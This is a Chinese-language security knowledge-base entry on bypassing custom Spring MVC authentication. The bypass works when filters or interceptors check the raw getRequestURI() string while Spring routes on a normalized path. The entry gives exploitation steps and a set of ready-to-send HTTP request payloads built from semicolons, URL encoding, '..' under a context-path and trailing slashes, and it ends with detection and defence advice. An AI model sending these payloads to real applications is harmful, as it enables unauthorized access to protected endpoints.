---
id: web-java-framework-spring-custom-auth-path-parsing-bypass
title: Spring 自定义鉴权按原始 URI 判断导致路径解析差异绕过
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-custom-auth-path-parsing-bypass
tags:
- java
- spring
- spring-mvc
- auth-bypass
- path-parsing
- access-control
- semicolon
- url-encoding
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:40:28+08:00'
  notes: 已对照原文与 60 张本地图核对：getRequestURI 原始路径、startsWith/endsWith/contains/equals 各类绕过、context-path=/app 时 /swagger/../app 的 getContextPath 归一化、removeSemicolonContent、尾部 / 匹配、5.3 后缀匹配默认关闭与 StrictHttpFirewall 均一致；图 04/41/48/49/50/56/57 的 200 与图 03/40/16/51 的 401/404 对照吻合。原文 5 张 xzfile 外链图无法读取（对应 URL 编码 controller 与 StrictHttpFirewall 文字已覆盖）。Spring Boot 2.7.0/Spring Web 5.3.20 为靶场环境而非受影响区间，已清空 versions。
url: /docs/web/java/framework/spring/web-java-framework-spring-custom-auth-path-parsing-bypass/
draft: false
kb_aliases:
- Java 自定义鉴权绕过
- getRequestURI 鉴权绕过
- startsWith 鉴权绕过
- endsWith 鉴权绕过
- 分号路径参数绕过
- Spring 路径解析差异
- context-path 目录穿越绕过
---

## 一句话结论

当自定义 Filter/HandlerInterceptor/AOP 用 `getRequestURI()`、`getRequestURL()` 等**原始未规范化路径**做 `startsWith`、`endsWith`、`contains`、`equals` 判断时，Spring MVC 在匹配 Controller 前会做 URL 解码、去除 `;` 路径参数、按 context-path 截取并归一化路径；攻击者构造一个“鉴权代码看到的是放行路径、Spring 实际路由到受保护接口”的请求即可绕过鉴权。

## 原理

- Servlet 的 `getRequestURI()`/`getRequestURL()` 直接返回 Tomcat `coyoteRequest` 中保存的原始请求目标，不做规范化、不解码、不解析 `..`、不删除 `;` 路径参数。`getServletPath()` 则会删除 `;` 后内容、URL 解码并解析 `..`，两者结果可能不同。
- Spring MVC 处理请求时，`DispatcherServlet#doService` 调用 `ServletRequestPathUtils.parseAndCache(request)`，再由 `RequestPath.parse(requestURI, contextPath)` 构造：
  - `fullPath`：原始 URI 解析出的路径元素；
  - `contextPath`：来自 `request.getContextPath()`；
  - `pathWithinApplication = fullPath.subPath(contextPath.elements().size())`。
- Tomcat 的 `Request#getContextPath()` 在查找 context-path 时，会逐个候选子串做“删除 `;` 参数 → URL 解码 → `RequestUtil.normalize()`（折叠 `//`、解析 `.`/`..`）”，再与配置的 `canonicalContextPath` 比较；匹配后返回**原始 URI 中对应的子串**（保留原始编码和 `..`）。
  - 配置了 `server.servlet.context-path=/app` 时，请求 `/swagger/../app/secure/data` 的 contextPath 被识别为 `/swagger/../app`（原始子串），其元素数为 6；`fullPath` 元素数为 10，`subPath(6)` 得到 `/secure/data`，正好匹配受保护 Controller。
  - context-path 为空或 `/` 时，`lastSlash == 0` 直接返回空串，`subPath(0)` 返回整个 `fullPath`，`..` 不被解析，`/swagger/../secure/data` 找不到 Controller（404）。这就是“有时 `../` 不起作用”的原因。
- `initLookupPath` 还会调用 `UrlPathHelper#removeSemicolonContent`：把 `;` 到下一个 `/` 之间的内容删除；若 `;` 后没有 `/`，则删除到字符串末尾。因此 `;.js`、`;swagger`、`;666` 等路径参数会被路由忽略，但会保留在原始 URI 中供鉴权代码判断。
- Controller 匹配阶段会对路径段做 URL 解码，并把末尾 `/` 当作可选结尾；因此被编码的段（`%61` 等）和尾部 `/` 仍能匹配到原 Controller。
- 在 Spring Web 5.3 之前，`useSuffixPatternMatch` 默认开启（5.3 起默认关闭，Boot 下默认关闭），`/users.*` 会匹配 `/users`；攻击者可用 `.swagger` 等后缀满足 `endsWith` 类放行规则。
- 根因是“鉴权判断使用的路径表示”和“路由匹配使用的路径表示”不一致；Payload 只是让两者产生差异的手段。

## 触发条件

- 应用使用自定义 Filter、Spring MVC HandlerInterceptor 或 AOP 做鉴权/放行，且判断依据是 `getRequestURI()`/`getRequestURL()` 等原始路径字符串。
- 判断逻辑是 `startsWith`、`endsWith`、`contains`、`equals` 等字符串比较，而不是基于规范化路径或框架路由的授权。
- 受保护 Controller 可通过路径变体到达（非根 context-path 时 `..` 可被 Spring 解析；或 `;`、编码、尾部 `/` 等被路由忽略）。
- 目标未被 Spring Security `StrictHttpFirewall` 等统一防火墙拦截（默认会拦截 `;`、`%2e`、`//` 等）。

## 利用步骤

1. 找到鉴权点：Filter 的 `doFilter`、Interceptor 的 `preHandle`、AOP 的 `@Around`，确认它如何获取路径、用什么比较。
2. 确认 context-path：根路径 `/` 或空时，`..` 通常失效；配置了 `/app` 等非根 context-path 时，`..` 可被 Spring 解析。
3. 按判断方式选择 Payload 家族：
   - `startsWith("/swagger")`：把 `/swagger/..` 放在前面，让 Spring 归一化到受保护路径；
   - `endsWith(".js")`：在受保护路径末尾加 `;.js`；
   - `contains("swagger")`：把 `swagger` 放进 `;` 路径参数或前置目录；
   - `equals("/app/system/admin")`：用 URL 编码或 `;` 让原始字符串不等、路由仍匹配；
   - 后缀白名单（`.do`/`.jsp`）：在末尾加 `/` 或 `;`。
4. 先请求正常受保护路径确认 401/302，再请求变体，观察是否 200 并返回业务数据。
5. 若失败，检查是否被 `StrictHttpFirewall` 拦截、context-path 是否为根、Spring 版本是否解析 `..`、Controller 路径是否包含 `..`。
6. 成功后访问管理接口完成越权操作。

## PoC

以下以原文靶场 `server.servlet.context-path=/app`、Spring Boot 2.7.0 / Spring Web 5.3.20 为例。

`startsWith("/swagger")` 放行：

```http
GET /swagger/../app/secure/data HTTP/1.1
Host: target:18083
```

```http
GET /swagger/..;666666/app/secure/data HTTP/1.1
Host: target:18083
```

```http
GET /swagger/////%2e%2e;666666/////%61%70%70/secure/data HTTP/1.1
Host: target:18083
```

```http
GET /swagger/////%2e%2e;666666/////%61%70%70/%73%65%63%75%72%65/%64%61%74%61 HTTP/1.1
Host: target:18083
```

`endsWith(".js")` 放行：

```http
GET /app/admin/dashboard;.js HTTP/1.1
Host: target:18083
```

```http
GET /app/admin;666666/dashboard;6666666;;;.js HTTP/1.1
Host: target:18083
```

`contains("swagger")` 放行：

```http
GET /swagger/../app/api/sensitive HTTP/1.1
Host: target:18083
```

```http
GET /app/api/sensitive;swagger HTTP/1.1
Host: target:18083
```

```http
GET /app/api;swagger/sensitive HTTP/1.1
Host: target:18083
```

后缀白名单 `.do` 的 `endsWith` 判断：

```http
GET /app/system/dashboard.do/ HTTP/1.1
Host: target:18083
```

```http
GET /app/system/dashboard.do; HTTP/1.1
Host: target:18083
```

`equals("/app/system/admin")` 放行（原始字符串不等，路由解码后匹配）：

```http
GET /app/system/%61dmin HTTP/1.1
Host: target:18083
```

后缀模式匹配（仅 `useSuffixPatternMatch=true` 时）：

```http
GET /app/api/sensitive.swagger HTTP/1.1
Host: target:18083
```

失败的对照：

```http
# context-path 为 / 时，pathWithinApplication 保留 ..，找不到 Controller
GET /swagger/../secure/data HTTP/1.1
# 把 .. 放在 Controller 路径中，Spring 不会在 Controller 匹配阶段解析
GET /app/api/swagger/../sensitive HTTP/1.1
```

## 变体与关联

- 变体：`;` 可放在任意路径段；编码可叠加（`%252e%252e` 等）；大小写、尾部 `/`、`%61` 等编码段都可组合。
- 变体：Spring Web 5.3 之前 `useSuffixPatternMatch` 默认开启，`/protected.swagger` 可同时满足 `endsWith(".swagger")` 类放行和 Controller 匹配。
- 变体：Spring Security 的 `StrictHttpFirewall` 默认拦截 `;`、`%2e`、`//`、反斜杠、`%00`、CR/LF 等；若目标引入 Spring Security，很多 Payload 会直接 500，需要找未被拦截的组合或应用自定义放行配置。
- 关联：[[web-java-framework-shiro-spring-path-auth-bypass]]（Shiro 与 Spring 的路径解析差异，同一类根因）。
- 关联：[[web-golang-escaped-vs-decoded-path-authz-bypass]]（其他语言/框架的编码路径鉴权绕过）。
- 关联：[[web-java-framework-spring-ghost-bits-path-traversal]]（Spring uriDecode 高位截断导致的路径穿越）。
- 边界：根 context-path、Controller 路径中直接出现 `..`、StrictHttpFirewall 默认配置、鉴权使用规范化路径时，对应 Payload 失效。

## 检测与防御

- 修复：鉴权不要使用 `getRequestURI()`/`getRequestURL()` 原始字符串做前缀/后缀/包含/相等判断；改用与路由一致的规范化路径，或直接在路由/Controller 层做授权（Spring Security 的 `MvcRequestMatcher` 等）。
- 修复：统一路径规范化：删除 `;` 路径参数、URL 解码、解析 `.`/`..`、折叠 `//`、拒绝反斜杠和控制字符，再进行比较；对无法规范化的请求直接拒绝。
- 加固：引入 Spring Security `StrictHttpFirewall`（默认 blocklist 已覆盖 `;`、`%2e`、`%2f`、`//`、`\`、`%00`、CR/LF 等）；不要为兼容性随意打开 `setAllowSemicolon`、`setAllowUrlEncodedSlash`、`setAllowUrlEncodedPeriod` 等开关。
- 加固：关闭 `useSuffixPatternMatch`（Spring 5.3+ 默认关闭）；授权规则使用精确路径 + HTTP 方法，不用通配前缀放行静态资源。
- 检测：请求路径含 `..`、`;`、`%2e`、`%2f`、`%61` 等编码段、连续 `/`、异常尾部 `/`；同一资源正常路径 401/302 而变体 200；Filter/Interceptor 日志中的 URI 与 Spring 路由日志中的 lookupPath 不一致；`RequestRejectedException` 日志。
- 测试：在 CI 中加入路径变体回归（`..`、`;`、编码、尾部 `/`、`.suffix`），验证鉴权与路由结论一致。
